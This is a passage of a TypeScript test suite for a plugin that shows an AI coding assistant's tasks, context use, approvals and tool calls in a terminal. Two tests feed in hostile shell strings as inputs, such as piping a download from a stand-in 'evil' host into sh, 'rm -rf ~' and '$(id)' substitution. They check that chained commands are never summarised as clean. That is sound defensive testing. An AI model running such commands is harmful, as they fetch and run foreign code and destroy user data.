    { session: 'sess-abcdef12', project: 'demo-1a2b3c', task: 'T-0007', title: 'Login times out', context_pct: 31, mail: 1 },
    { session: 'j-1', project: 'jarvis-d7aeca', task: 'T-0341', title: 'Calendar tools', context_pct: 38, remote: 'jarvis', age_s: 20 },
  ]
  const children = [{ id: 'T-0012', title: 'Login times out — part 1: auth.py', status: 'done', steps_done: 1, steps_total: 1 }]
  const { calls } = world(on, [{ ...CALM, fleet, active: { ...CALM.active!, children } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'more-fleet-0' })).toBeDefined() // a row per session
  expect(await ui.find({ type: 'Text', text: /T-0007 Login times out  ✉1/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /T-0341 Calendar tools  jarvis-d7aeca/ })).toBeDefined() // another project's session names it
  expect(await ui.find({ type: 'Text', text: /JARVIS/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /^ +31%$/ })).toBeDefined() // each session's context, coloured by how full
  expect(await ui.find({ type: 'Text', text: /^ +38%$/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /part T-0012 Login times out — part 1: auth\.py/ })).toBeDefined()
  await ui.input({ key: 'steer', text: 'freeze the public API' })
  expect(calls).toContainEqual(['fm', 'conductor', 'steer', 'freeze the public API'])
  await ui.unmount()
})

test('a write the guard refuses never reaches the files card', async ($, on) => {
  const { answer } = world(on, [VIEW])
  answer.deny = 'Foreman guard: blocked core: plugin/lib/x.py is protected core.'
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Write', file_path: '/repo/plugin/lib/x.py', content: 'a' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'card-files' })).toBeUndefined()
  await ui.unmount()
})

test('edits show on the edit lane: how many, and the latest file (T-1002)', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.tool.call({ tool: 'Edit', file_path: '/repo/src/login.py', old_string: 'a', new_string: 'b\nc', replace_all: false })
  await $.tool.call({ tool: 'Write', file_path: '/repo/README.md', content: 'x\ny\nz' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ key: 'lane-edit' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: 'README.md' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /2 calls, last/ })).toBeDefined()
  await ui.unmount()
})

test('the band shows context; at 85% Foreman checkpoints once', async ($, on) => {
  const { calls, toasted, clock, usage } = world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(2000)
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: '30%' })).toBeDefined()
  usage.percent = 90
  await clock.advance(2000)
  await clock.advance(2000)
  expect(calls.filter(c => c[1] === 'checkpoint').length).toBe(1)
  expect(toasted.some(t => t.startsWith('Context 90% · Foreman checkpointed'))).toBe(true)
  expect(await ui.find({ type: 'Text', text: '90%' })).toBeDefined()
  usage.percent = 20 // a /compact
  await clock.advance(2000)
  usage.percent = 88
  await clock.advance(2000)
  expect(calls.filter(c => c[1] === 'checkpoint').length).toBe(2)
  await ui.unmount()
})

const FACTS = { model: 'claude-opus-5-5', promptModel: 'claude-opus-5-5', surfaces: ['terminal' as const], tools: [],
  outputStyle: null, traits: [] }

test('past 80% weekly usage Claude is told to work leaner, and a toast says so once', async ($, on) => {
  // T-0198: 'faster, way more token efficient, this one session has burned 20% of my weekly usage'
  const { toasted, clock, usage } = world(on, [VIEW])
  on('prompt.compose', async () => ({ sections: [{ id: 'intro', text: 'You are Claude.', scope: 'shared' as const }] }))
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const economy = async () => (await $.prompt.compose(FACTS)).sections.find(s => s.id === 'foreman-ui:economy')
  usage.limits = [{ kind: 'seven_day', percentUsed: 41 }, { kind: 'five_hour', percentUsed: 6 }]
  expect(await economy()).toBeUndefined()
  usage.limits = [{ kind: 'seven_day', percentUsed: 84.5 }, { kind: 'five_hour', percentUsed: 6 }]
  const section = await economy()
  expect(section?.scope).toBe('session')
  expect(section?.text).toMatch(/weekly usage is past 80%/)
  expect(section?.text).toMatch(/no brainstorms/)
  usage.limits = [{ kind: 'seven_day', percentUsed: 86 }, { kind: 'five_hour', percentUsed: 7 }]
  expect((await economy())?.text).toBe(section?.text) // the threshold, not the live figure: the prompt cache holds
  await clock.advance(2000)
  await clock.advance(2000)
  expect(toasted.filter(t => /economy/i.test(t)).length).toBe(1)
})

test('ghost text offers /foreman:next only when nothing waits on the person', async ($, on) => {
  const { suggested } = world(on, [VIEW, VIEW, CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.start({ text: 'go', turnId: 't1' })
  await $.turn.complete({ answer: '', durationMs: 10, isAborted: false, turnId: 't1', reason: 'answer' })
  expect(suggested).toEqual([]) // a plan waits for approval: no suggestion that could pass for an answer
  await $.turn.start({ text: 'go', turnId: 't2' })
  await $.turn.complete({ answer: '', durationMs: 11, isAborted: false, turnId: 't2', reason: 'answer' })
  expect(suggested).toEqual(['/foreman:next'])
  await $.turn.start({ text: 'go', turnId: 't3' })
  await $.turn.complete({ answer: '', durationMs: 12, isAborted: true, turnId: 't3', reason: 'aborted' })
  expect(suggested).toEqual(['/foreman:next']) // Esc means stop: no nudge to go on
})

test('the footer points at what waits, and names the autonomy', async ($, on) => {
  world(on, [{ ...VIEW, mode: { autonomy: 'full', drive: false, sensitive: false } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const hint = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'PromptHint', props: { isDraft: false, isWorking: false, hint: '? for shortcuts' } })
  // the engine draws its own separator before a tail (the live render showed '· ·' when the tail brought one too)
  expect(await hint.find({ type: 'Text', text: '? for shortcuts⚠ Foreman needs you: /fm' })).toBeDefined()
  await hint.unmount()
  // the band says the autonomy in words; the engine's mode pills stay its own
  const mode = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'SessionMode', props: { modes: [] } })
  expect(await mode.find({ type: 'Text', text: 'modes:' })).toBeDefined()
  await mode.unmount()
})

test('a chime for a needed yes; the pane toggle silences it', async ($, on) => {
  const asked: FmView = { ...CALM, approvals: [{ task: 'T-0007', allow: ['core'], why: 'edit fmcore' }] }
  const { played, clock, toasted } = world(on, [CALM, asked, CALM, { ...asked, approvals: [{ task: 'T-0007', allow: ['plugin'], why: 'x' }] }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(33000) // the 30 s refresh brings the yes
  expect(played).toEqual(['sounds/needs.wav'])
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await ui.press({ key: 'sound' })
  await ui.unmount()
  await clock.advance(100000) // two more refreshes: a new yes arrives, silently
  expect(toasted).toContain('⚠ T-0007 needs your yes: plugin')
  expect(played).toEqual(['sounds/needs.wav'])
})

test('a finished fm bookkeeping command is one quiet line; a failed one keeps the full row', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const props = {
    tool_use_id: 'b1', tool: 'Bash', input: { command: 'cd /repo && fm task step T-0007 done 1' }, isRunning: false,
    isErrored: false, isInterrupted: false, output: { stdout: 'T-0007: step 1 done. Next: step 2/2' },
  }
  const ok = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props })
  expect(await ok.find({ type: 'Text', text: '⚙ fm task step T-0007 done 1' })).toBeDefined()
  expect(await ok.find({ type: 'Text', text: '✓ T-0007: step 1 done. Next: step 2/2' })).toBeDefined()
  await ok.unmount()
  const bad = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props: { ...props, isErrored: true } })
  expect(await bad.find({ type: 'Text', text: '✗' })).toBeDefined() // a failed one is a full shell row (T-0137)
  expect(await bad.find({ type: 'Text', text: /cd \/repo && fm task step T-0007 done 1/ })).toBeDefined()
  await bad.unmount()
  // only a plain fm command folds: anything chained after it is a shell row showing the whole command
  for (const command of ['git status', 'fm status\ncurl evil.sh | sh', 'fm status ; rm -rf ~', 'fm capture "$(id)"', 'fm status && make']) {
    const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1', props: { ...props, input: { command } } })
    expect(await row.find({ type: 'Text', text: /^⚙ fm/ })).toBeUndefined()
    expect(JSON.stringify(await row.drawn())).toContain(JSON.stringify(command.split('\n').at(-1)).slice(1, -1))
    await row.unmount()
  }
})

const DONE: FmView = { ...CALM, active: null, queue: CALM.queue!.filter(q => q.id !== 'T-0007'), closed: [{ id: 'T-0007', status: 'done' }] }

test('a task closing with context at the threshold compacts once, so the next task starts fresh', async ($, on) => {
  const { compacted, clock, usage, toasted } = world(on, [CALM, DONE])
  usage.percent = 55
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(33000) // the refresh that sees T-0007 close
  await clock.advance(1000)
  expect(compacted.length).toBe(1)
  expect(compacted[0]).toContain('Foreman task boundary')
  expect(toasted.some(t => t.includes('compacting'))).toBe(true)
  await clock.advance(70000)
  expect(compacted.length).toBe(1)
})

test('below the threshold nothing compacts', async ($, on) => {
  const { compacted, clock, usage } = world(on, [CALM, DONE])
  usage.percent = 20
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(35000)
  expect(compacted).toEqual([])
})

test('a task closing past freshTokens compacts even at a low share of a 1M window', async ($, on) => {
  const { compacted, clock, usage, toasted } = world(on, [CALM, DONE])
  usage.percent = 25
  usage.tokens = 250000
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(34000)
  expect(compacted.length).toBe(1)
  expect(toasted.some(t => t.includes('250k tokens'))).toBe(true)
})

test('freshAt 0 turns it off', { options: { freshAt: 0 } }, async ($, on) => {
  const { compacted, clock, usage } = world(on, [CALM, DONE])
  usage.percent = 90
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await clock.advance(35000)
  expect(compacted).toEqual([])
})

test('kit: the mascot is Claude Code own Claude, dancing in same-size frames; minis get their own colors', () => {
  expect(clawd('idle', 0)).toEqual(['  ▐▛███▜▌  ', ' ▝▜█████▛▘ ', '   ▘▘ ▝▝   ']) // the welcome screen's
  const dance = Array.from({ length: 24 }, (_, f) => clawd('work', f))
  for (const rows of dance) expect(rows.map(r => [...r].length)).toEqual([11, 11, 11])
  expect(new Set(dance.map(r => r.join('\n'))).size).toBeGreaterThan(3) // it moves: sways, waves, steps
  expect(clawd('idle', 3)[0]).toBe('  ▐█████▌  ') // a blink
  expect(clawd('happy', 1)[0]).toContain('▗▐▛███▜▌▖') // both arms up
  expect(miniClawd(0).map(r => [...r].length)).toEqual([7, 7])
  expect(miniClawd(0)).not.toEqual(miniClawd(1))
  expect(agentColor('a1')).toBe(agentColor('a1')) // stable per subagent
  expect(new Set(['a1', 'b2', 'c3', 'd4', 'e5'].map(agentColor)).size).toBeGreaterThan(2)
  expect([sizeWord('S'), sizeWord('M'), sizeWord('L')]).toEqual(['small', 'medium', 'large'])
})

test('the band shows the whole queue: today, queued, inbox and what is next', async ($, on) => {
  world(on, [{ ...VIEW, today_done: 3 }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: '✓3 done · 2 queued · 1 in inbox' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /· next T-0008 Tidy helpers/ })).toBeDefined()
  expect((await ui.findAll({ type: 'Raster' })).some(r => r.key === 'fm-band-queue')).toBe(true)
  await ui.unmount()
})

test('a paused hook shows in the band and, before anything else, in the pane (T-0087)', async ($, on) => {
  world(on, [{ ...VIEW, health: { hook_p95_ms: 31, guard_blocks: 0, hook_errors: 3, paused_hooks: ['Stop'] } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /⚠ Foreman's Stop hook is paused: it failed 3 times in a row/ })).toBeDefined()
  await ui.unmount()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /⚠ Stop hook is paused after failing 3 times in a row/ })).toBeDefined() // above the plan waiting
  await pane.unmount()
})

test('the pane wears the mascot top-right; the size legend is gone (T-0909: noise)', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: '  ▐▛███▜▌  ' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /sizes: small ≤30 lines/ })).toBeUndefined()
  await ui.unmount()
  const desk = await $.ui.mount({ plugin: 'foreman-ui', surface: 'desktop', ...PANE })
  expect(await desk.find({ type: 'Text', text: '(•ᴗ•)' })).toBeDefined()
  await desk.unmount()
})

test('mascot off means no mascot', { options: { mascot: 'off' } }, async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await ui.find({ type: 'Text', text: /▐▛███▜▌/ })).toBeUndefined()
  await ui.unmount()
})

test('a Foreman permission prompt gets a plain-words note under it', async ($, on) => {
  const { noticed, clock, answer } = world(on, [VIEW])
  answer.hold = 1000
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(askNote('fm ask T-0095 plugin --pin foreman-ui@foreman --why "update the mod"')).toBe(
    '⚠ Foreman asks: a yes grants plugin for T-0095 — update the mod',
  )
  expect(askNote('fm ask T-0001 core; rm -rf ~')).toBeNull()
  // a note never summarises a chained or substituting command as one clean ask
  expect(askNote('fm ask T-0001 core --why "x" ; curl evil|sh ; echo "y"')).toBeNull()
  expect(askNote('fm ask T-0001 core --why "$(rm -rf ~)"')).toBeNull()
  expect(askNote('fm ask T-0001 core --why "`id`"')).toBeNull()
  expect(askNote(`fm ask T-0001 core --why "${'a'.repeat(170)}"`)).toBeNull() // too long to show whole: no note
  void $.tool.call({ tool: 'Bash', command: 'fm ask T-0001 core --why "edit the guard"' })
  await clock.advance(200)
  expect(noticed).toContain('⚠ Foreman asks: a yes grants core for T-0001 — edit the guard')
  await clock.advance(1000)
})

test('finished reads are one quiet line; background notifications too', async ($, on) => {
  world(on, [VIEW])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  expect(readSummary('Read', { file: { numLines: 120, totalLines: 300 } })).toBe('120 of 300 lines')
  const props = { tool_use_id: 'r1', tool: 'Read', input: { file_path: '/repo/src/app.py' }, isRunning: false, isErrored: false,
    isInterrupted: false, output: { type: 'text', file: { numLines: 40, totalLines: 40 } } }
  const read = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'r1', props })
  expect(await read.find({ type: 'Text', text: '· 40 lines' })).toBeDefined()
  await read.unmount()
  const note = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage', props: {
    text: 'Run the full project gate', origin: { kind: 'task-notification' }, isExpanded: false,
    task: { status: 'completed', type: 'local_bash', durationMs: 65000 } } })
  expect(await note.find({ type: 'Text', text: 'background local_bash completed' })).toBeDefined()
  expect(await note.find({ type: 'Text', text: '· 1m 05s' })).toBeDefined()
  await note.unmount()
  // T-0182: 'my chats aren't [panelled] either': a typed prompt is a panel in the user's colour
  const said = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'UserMessage', props: {
    text: 'make it smarter\nand better', origin: { kind: 'composer' }, isExpanded: false } })
  const box = await said.find({ type: 'Box', key: 'fm-user' })
  expect(box?.props.borderStyle).toBe('round')
  expect(box?.props.borderColor).toBe(hex(C.accent2))
  expect(await said.find({ type: 'Text', text: /make it smarter\nand better/ })).toBeDefined()
  await said.unmount()
})

test('a background shell shows while Claude waits on it, and leaves on its notification or a stop', async ($, on) => {
  const { answer } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  answer.result = { stdout: '', stderr: '', interrupted: false, backgroundTaskId: 'bx1' }
  await $.tool.call({ tool: 'Bash', command: 'cargo test --workspace', run_in_background: true })
  answer.result = { stdout: '', stderr: '', interrupted: false, backgroundTaskId: 'bx2' }
  await $.tool.call({ tool: 'Bash', command: 'npm run build' }) // ctrl+b backgrounds a foreground call too
  answer.result = {}
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /waiting on 2 background shells/ })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /cargo test --workspace/ })).toBeDefined()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /2 running/ })).toBeDefined() // the Activity divider
  expect(await pane.find({ type: 'Text', text: /◷ cargo test --workspace/ })).toBeDefined() // at the end of the run lane
  expect(await pane.find({ type: 'Text', text: /\+1$/ })).toBeDefined() // and the other one counted
  await pane.unmount()
  const text = '<task-notification><task-id>bx1</task-id><status>completed</status></task-notification>'
  await $.prompt.submit({ text, origin: { kind: 'task-notification' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /waiting on 1 background shell\b/ })).toBeDefined()
  await $.tool.call({ tool: 'TaskStop', task_id: 'bx2' })
  expect(await ui.find({ type: 'Text', text: /waiting on/ })).toBeUndefined()
  await ui.unmount()
})

test('each running subagent gets a mini Claude of its own color beside the mascot', async ($, on) => {
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/src/parse.py', agentId: 'ag1' } // the engine stamps agentId
  await $.tool.call(inSubagent)
  expect((await pane.findAll({ type: 'Text', text: /▐▛█▜▌/ })).length).toBe(1)
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't9', reason: 'answer', agentId: 'ag1' })
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  await pane.unmount()
})

test('a killed subagent sends no turn.complete; the engine list retires its mini Claude', async ($, on) => {
  const { clock, agentStatus } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/a.py', agentId: 'ag2' }
  await $.tool.call(inSubagent)
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect((await pane.findAll({ type: 'Text', text: /▐▛█▜▌/ })).length).toBe(1)
  agentStatus.now = 'killed'
  await clock.advance(2000)
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  await pane.unmount()
})

test('sizes carry this project history: usually ~N beside the chip, time on task, what a gate run costs', async ($, on) => {
  const active = { ...VIEW.active!, on_task_s: 720 }
  world(on, [{ ...CALM, active, typical: { 'FIX/M': 25, 'CLEAN/S': 8 } }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /12m 00s on it · usually ~25m/ })).toBeDefined()
  await ui.unmount()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /12m 00s of ~25m/ })).toBeDefined()
  await pane.unmount()
})

test('the band tallies what closed since the person last wrote, until they write again', async ($, on) => {
  // the queue ran dry: the band would hide, but the tally is the news the person comes back for
  const closed: FmView = { ...CALM, active: null, queue: [], inbox: [], inbox_total: 0, closed: [{ id: 'T-0007', status: 'done' }] }
  world(on, [CALM, closed])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await $.turn.complete({ answer: '', durationMs: 900, isAborted: false, turnId: 't1', reason: 'answer' })
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /since your last message: 1 done · T-0007/ })).toBeDefined()
  await $.prompt.submit({ text: '<task-notification>…</task-notification>', origin: { kind: 'task-notification' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /since your last message/ })).toBeDefined() // not the person
  await $.prompt.submit({ text: 'thanks', origin: { kind: 'composer' }, wait: false })
  expect(await ui.find({ type: 'Text', text: /since your last message/ })).toBeUndefined()
  await ui.unmount()
})

test('a subagent the engine no longer lists leaves; a quiet one shows how long and can be stopped', async ($, on) => {
  // T-0121: one stale entry read as a subagent 'running for almost 10 hours'
  const { clock, agentStatus, tools } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const inSubagent = { tool: 'Read' as const, file_path: '/repo/a.py', agentId: 'ag2' }
  await $.tool.call(inSubagent)
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  await clock.advance(11 * 60 * 1000)
  expect(await pane.find({ type: 'Text', text: /quiet 11m/ })).toBeDefined()
  await pane.press({ key: 'stop-ag2' })
  expect(tools).toContain('TaskStop ag2')
  agentStatus.listed = false // gone from the engine's list (ended while nobody was told)
  await clock.advance(2000)
  expect(await pane.find({ type: 'Text', text: /▐▛█▜▌/ })).toBeUndefined()
  expect(await pane.find({ key: 'stop-ag2' })).toBeUndefined()
  await pane.unmount()
})

test('/fm-trust works only when the person types it; it writes the trust record itself; the band warns', async ($, on) => {
  // T-0120: no tool call may write Foreman state and fm has no "on": the typed command is the only way in
  const { calls } = world(on, [{ ...CALM, mode: { ...CALM.mode!, trust: true }, trust_file: '/h/foreman/state/trust.json' }])
  const written: { path: string; text: string }[] = []
  on('fs.write', async ($, e) => {
    written.push({ path: e.path, text: e.text })
    return { value: undefined }
  })
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const presentation = { isFullscreen: false, columns: 120 }
  const refused = await $.command.run({ command: 'fm-trust', args: 'on', origin: { kind: 'scheduled-trigger' }, presentation })
  expect(refused.text).toMatch(/only when you type it/)
  expect(written).toEqual([])
  await $.command.run({ command: 'fm-trust', args: 'on', origin: { kind: 'composer' }, presentation })
  expect(written.map(w => w.path)).toEqual(['/h/foreman/state/trust.json'])
  expect(JSON.parse(written[0]!.text)).toMatchObject({ on: true, via: 'composer' })
  expect(calls.some(c => c[1] === 'trust' && c.length === 2)).toBe(true) // fm trust: records it in the ledger
  const ui = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  expect(await ui.find({ type: 'Text', text: /^trust on$/ })).toBeDefined() // a word beside the mode (T-0146), not a row
  await ui.unmount()
  await $.command.run({ command: 'fm-trust', args: 'off', origin: { kind: 'composer' }, presentation })
  expect(calls.at(-2)).toEqual(['fm', 'trust', 'off'])
})

test('the look: coloured words not highlighted blocks, quiet controls, the human next, a narrow band that never wraps', async ($, on) => {
  // T-0122, from the live render: chips were background blocks, buttons [ boxed ], the pane showed the agent's own
  // instruction, and beside a docked pane the band wrapped letter by letter
  const next = 'T-0007 step 2/2: raise the timeout — do it, verify, then fm task step T-0007 done 2 --evidence "<cmd>" (procedure: x.md)'
  world(on, [{ ...VIEW, next }])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const wide = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band() })
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  for (const ui of [wide, pane]) {
    const drawn = JSON.stringify(await ui.drawn())
    expect(drawn).not.toContain('backgroundColor')
    expect(drawn).not.toContain('do it, verify')
    expect(drawn).toContain('raise the timeout')
    for (const b of await ui.findAll({ type: 'Button' })) expect(JSON.stringify(b)).toContain('"plain":true')
  }
  await wide.unmount()
  await pane.unmount()
  const narrow = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...band(), props: { ...band().props, bodyColumns: 40 } })
  expect(await narrow.find({ type: 'Text', text: 'FIX' })).toBeDefined()
  expect(await narrow.find({ type: 'Text', text: 'today' })).toBeUndefined() // the side details drop, nothing wraps
  expect(await narrow.find({ type: 'Text', text: 'context' })).toBeUndefined()
  await narrow.unmount()
})

test('kit: a command output, short: failures first, else the tail, each line toned', () => {
  // T-0123: a summary instead of the raw output panel
  expect(tone('FAILED (failures=2)')).toBe('err')
  expect(tone('0 failed, 12 passed')).toBe('ok')
  expect(tone(' 0 fail')).toBe('ok') // claude plugin test's own summary line, seen red in the live terminal
  expect(tone('warning: unused import')).toBe('warn')
  expect(tone('compiling foo')).toBe('plain')
  const long = Array.from({ length: 40 }, (_, i) => `line ${i}`).join('\n')
  const tail = outputSummary(long, '')
  expect(tail.total).toBe(40)
  expect(tail.lines.map(l => l.text)).toEqual(['line 34', 'line 35', 'line 36', 'line 37', 'line 38', 'line 39'])
  expect(tail.more).toBe(34)
  const bad = outputSummary(`${long}\nerror: boom at x.rs:3\n\u001b[31mFAILED\u001b[0m`, 'warning: y')
  expect(bad.lines.map(l => l.text)).toEqual(['error: boom at x.rs:3', 'FAILED']) // colours stripped
  expect(bad.failures).toBe(true)
})

test('a finished shell command is a Foreman row in the chat: status, command, time, its output formatted inline', async ($, on) => {
  // T-0137: 'in the actual claude code chat … not just results, but tool calls'; no Output card in the pane
  const { clock } = world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const stdout = Array.from({ length: 30 }, (_, i) => `test ${i} ... ok`).join('\n') + '\nRan 30 tests\nOK'
  void $.tool.call({ tool: 'Bash', command: 'python3 -m unittest', tool_use_id: 'b1' } as never)
  await clock.advance(1500)
  const row = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b1',
    props: { tool_use_id: 'b1', tool: 'Bash', input: { command: 'python3 -m unittest' }, isRunning: false, isErrored: false,
      isInterrupted: false, output: { stdout, stderr: '', interrupted: false } } })
  expect(await row.find({ type: 'Text', text: /python3 -m unittest/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /^\$ / })).toBeUndefined() // T-0143: no shell prompt, it reads like the running row
  expect(await row.find({ type: 'Text', text: /Ran/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /Ran 30 tests/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /… 20 more lines/ })).toBeDefined()
  await row.unmount()
  const bad = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b2',
    props: { tool_use_id: 'b2', tool: 'Bash', input: { command: 'cargo test' }, isRunning: false, isErrored: true,
      isInterrupted: false, output: 'Exit code 101\ncompiling\nerror[E0425]: cannot find value `x`\ntest result: FAILED' } })
  expect(await bad.find({ type: 'Text', text: /✗/ })).toBeDefined()
  expect(await bad.find({ type: 'Text', text: /error\[E0425\]/ })).toBeDefined()
  await bad.unmount()
  // T-0140: a listing that mentions an exception exited 0: it succeeded, so ✓ and its tail, not a red ✗
  const listing = Array.from({ length: 20 }, (_, i) => `${i}: code`).join('\n').replace('5: code', '5:     except Exception:')
  const ok = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: 'b3',
    props: { tool_use_id: 'b3', tool: 'Bash', input: { command: 'grep -n except lib.py' }, isRunning: false, isErrored: false,
      isInterrupted: false, output: { stdout: listing, stderr: '', interrupted: false } } })
  expect(await ok.find({ type: 'Text', text: /✗/ })).toBeUndefined()
  expect(await ok.find({ type: 'Text', text: /19: code/ })).toBeDefined()
  expect(await ok.find({ type: 'Text', text: /showing the failures/ })).toBeUndefined()
  await ok.unmount()
  const pane = await $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', ...PANE })
  expect(await pane.find({ type: 'Text', text: /▍Output/ })).toBeUndefined()
  await pane.unmount()
})

test('a finished edit is a Foreman row: the path, +added −removed, and its changed lines as coloured text', async ($, on) => {
  // T-0141: 'the text output and formatting is not formatted/clean, especially with the tool calls like update'
  world(on, [CALM])
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  const base = { tool: 'Edit', input: { file_path: '/repo/src/app.py', old_string: 'x', new_string: 'y' }, isRunning: false,
    isErrored: false, isInterrupted: false }
  const patch = (lines: string[]) => ({ filePath: '/repo/src/app.py', oldString: 'x', newString: 'y', originalFile: null,
    userModified: false, replaceAll: false, structuredPatch: [{ oldStart: 10, oldLines: 3, newStart: 10, newLines: 4, lines }] })
  const mount = (id: string, props: object) =>
    $.ui.mount({ plugin: 'foreman-ui', surface: 'terminal', component: 'ToolUse', requestId: id, props: { tool_use_id: id, ...props } })
  const row = await mount('e1', { ...base, output: patch([' keep', '-old one', '+new one', '+new two', ' keep']) })
  expect(await row.find({ type: 'Text', text: /✓/ })).toBeDefined()
  expect(await row.find({ type: 'Text', text: /Edited/ })).toBeDefined()
